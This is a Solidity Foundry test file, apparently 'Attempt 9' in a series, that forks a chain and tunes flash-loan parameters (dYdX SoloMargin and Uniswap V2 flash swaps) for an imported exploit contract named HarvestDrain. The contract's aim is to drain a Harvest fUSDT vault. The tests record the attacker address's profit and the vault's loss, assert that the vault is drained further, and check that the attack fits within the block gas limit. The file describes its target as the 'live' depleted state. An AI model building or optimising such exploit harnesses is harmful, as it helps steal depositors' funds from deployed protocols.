// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

/// @title Harvest Attempt 9
/// @notice Probes larger live-head Harvest retunes that combine dYdX SoloMargin USDC with UniV2 flash-swaps.
/// @dev Hypothesis: on the current depleted live state, replacing part of the inner USDC flash leg with
///      zero-fee dYdX liquidity reopens a 15M+ swap body even though the older pure-UniV2 equal-body windows died.
contract Attempt9 is Test {
    struct Config {
        uint256 outerUsdtFlash;
        uint256 innerUsdcFlash;
        uint256 soloUsdcFlash;
        uint256 swapSize;
        uint256 iterations;
    }

    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
    IHVault internal constant FUSDT_VAULT = IHVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);

    function setUp() public {
        vm.createSelectFork("ch2");
    }

    function test_repeat_selected_config() public {
        Config memory config = Config({
            outerUsdtFlash: vm.envUint("HARVEST_TEST_OUTER_USDT_FLASH"),
            innerUsdcFlash: vm.envUint("HARVEST_TEST_INNER_USDC_FLASH"),
            soloUsdcFlash: vm.envUint("HARVEST_TEST_SOLO_USDC_FLASH"),
            swapSize: vm.envUint("HARVEST_TEST_SWAP_SIZE"),
            iterations: vm.envUint("HARVEST_TEST_ITERATIONS")
        });
        uint256 maxRepeats = vm.envOr("HARVEST_TEST_MAX_REPEATS", uint256(1));

        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = FUSDT_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsBefore = FUSDT_VAULT.getPricePerFullShare();

        (bool success, uint256 nativeDelta, uint256 vaultDelta) = _probeConfig(config, maxRepeats);

        uint256 nativeAfter = ATTACKER.balance;
        uint256 vaultAfter = FUSDT_VAULT.underlyingBalanceWithInvestment();
        uint256 ppfsAfter = FUSDT_VAULT.getPricePerFullShare();

        console.log("REPEAT_NATIVE_BEFORE:", nativeBefore);
        console.log("REPEAT_NATIVE_AFTER:", nativeAfter);
        console.log("REPEAT_NATIVE_DELTA:", nativeDelta);
        console.log("REPEAT_VAULT_BEFORE:", vaultBefore);
        console.log("REPEAT_VAULT_AFTER:", vaultAfter);
        console.log("REPEAT_VAULT_DELTA:", vaultDelta);
        console.log("REPEAT_PPFS_BEFORE:", ppfsBefore);
        console.log("REPEAT_PPFS_AFTER:", ppfsAfter);

        assertTrue(success, "selected config reverted immediately");
        assertGt(nativeDelta, 0, "selected config must raise native balance");
        assertGt(vaultDelta, 0, "selected config must drain the vault further");
    }

    function test_trace_selected_config() public {
        Config memory config = Config({
            outerUsdtFlash: vm.envUint("HARVEST_TEST_OUTER_USDT_FLASH"),
            innerUsdcFlash: vm.envUint("HARVEST_TEST_INNER_USDC_FLASH"),
            soloUsdcFlash: vm.envUint("HARVEST_TEST_SOLO_USDC_FLASH"),
            swapSize: vm.envUint("HARVEST_TEST_SWAP_SIZE"),
            iterations: vm.envUint("HARVEST_TEST_ITERATIONS")
        });

        vm.startPrank(ATTACKER);
        HarvestDrain drain = new HarvestDrain(
            ATTACKER,
            config.outerUsdtFlash,
            config.innerUsdcFlash,
            config.soloUsdcFlash,
            config.swapSize
        );
        drain.execute(config.iterations);
        vm.stopPrank();
    }

    function test_selected_config_block_gas() public {
        Config memory config = Config({
            outerUsdtFlash: vm.envUint("HARVEST_TEST_OUTER_USDT_FLASH"),
            innerUsdcFlash: vm.envUint("HARVEST_TEST_INNER_USDC_FLASH"),
            soloUsdcFlash: vm.envUint("HARVEST_TEST_SOLO_USDC_FLASH"),
            swapSize: vm.envUint("HARVEST_TEST_SWAP_SIZE"),
            iterations: vm.envUint("HARVEST_TEST_ITERATIONS")
        });

        vm.prank(ATTACKER);
        HarvestDrain drain = new HarvestDrain(
            ATTACKER,
            config.outerUsdtFlash,
            config.innerUsdcFlash,
            config.soloUsdcFlash,
            config.swapSize
        );

        vm.prank(ATTACKER);
        (bool ok, bytes memory reason) =
            address(drain).call{gas: block.gaslimit}(abi.encodeCall(HarvestDrainMulti.execute, (config.iterations)));

        console.log("BLOCK_GAS_LIMIT:", block.gaslimit);
        console.log("BLOCK_GAS_CALL_OK:", ok);
        if (!ok) {
            console.log("BLOCK_GAS_REVERT_REASON:", _decodeRevert(reason));
        }

        assertTrue(ok, "selected config does not fit block gas limit");
    }

    function _probeConfig(
        Config memory config,
        uint256 maxRepeats
    ) internal returns (bool success, uint256 nativeDelta, uint256 vaultDelta) {
        uint256 snapshot = vm.snapshot();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 vaultBefore = FUSDT_VAULT.underlyingBalanceWithInvestment();
        uint256 repeatCount;

        vm.startPrank(ATTACKER);
        HarvestDrain drain = new HarvestDrain(
            ATTACKER,
            config.outerUsdtFlash,
            config.innerUsdcFlash,
            config.soloUsdcFlash,
            config.swapSize
        );
        vm.stopPrank();

        console.log("CONFIG_OUTER_USDT_FLASH:", config.outerUsdtFlash);
        console.log("CONFIG_INNER_USDC_FLASH:", config.innerUsdcFlash);
        console.log("CONFIG_SOLO_USDC_FLASH:", config.soloUsdcFlash);
        console.log("CONFIG_SWAP_SIZE:", config.swapSize);
        console.log("CONFIG_ITERATIONS:", config.iterations);
        console.log("CONFIG_VAULT_PPFS:", FUSDT_VAULT.getPricePerFullShare());
        console.log("CONFIG_VAULT_UNDERLYING:", vaultBefore);

        for (uint256 i; i < maxRepeats; ++i) {
            uint256 previousNative = ATTACKER.balance;
            uint256 previousVault = FUSDT_VAULT.underlyingBalanceWithInvestment();
            uint256 gasBefore = gasleft();

            vm.startPrank(ATTACKER);
            try drain.execute(config.iterations) {
                vm.stopPrank();
            } catch (bytes memory reason) {
                vm.stopPrank();
                console.log("CONFIG_REVERT_AT_REPEAT:", i + 1);
                console.log("CONFIG_REVERT_REASON:", _decodeRevert(reason));
                break;
            }

            uint256 currentNative = ATTACKER.balance;
            uint256 currentVault = FUSDT_VAULT.underlyingBalanceWithInvestment();
            uint256 executeGasUsed = gasBefore - gasleft();

            console.log("CONFIG_REPEAT_INDEX:", i + 1);
            console.log("CONFIG_REPEAT_GAS_USED:", executeGasUsed);
            console.log("CONFIG_REPEAT_NATIVE_DELTA:", currentNative - previousNative);
            console.log("CONFIG_REPEAT_VAULT_DELTA:", previousVault - currentVault);

            if (currentNative <= previousNative || currentVault >= previousVault) {
                console.log("CONFIG_STOP_AT_REPEAT:", i + 1);
                break;
            }

            success = true;
            repeatCount = i + 1;
        }

        nativeDelta = ATTACKER.balance - nativeBefore;
        vaultDelta = vaultBefore - FUSDT_VAULT.underlyingBalanceWithInvestment();

        console.log("CONFIG_SUCCESSFUL_REPEATS:", repeatCount);
        console.log("CONFIG_NATIVE_DELTA_TOTAL:", nativeDelta);
        console.log("CONFIG_VAULT_DELTA_TOTAL:", vaultDelta);
        console.log("CONFIG_VAULT_AFTER:", FUSDT_VAULT.underlyingBalanceWithInvestment());
        console.log("CONFIG_PPFS_AFTER:", FUSDT_VAULT.getPricePerFullShare());

        bool reverted = vm.revertTo(snapshot);
        require(reverted, "snapshot restore failed");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "empty revert data";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }

        if (selector == bytes4(keccak256("Error(string)"))) {
            bytes memory payload = new bytes(revertData.length - 4);
            for (uint256 i; i < payload.length; ++i) {
                payload[i] = revertData[i + 4];
            }
            return abi.decode(payload, (string));
        }

        if (selector == bytes4(keccak256("Panic(uint256)"))) {
            return "panic(uint256)";
        }

        return "non-standard revert";
    }
}
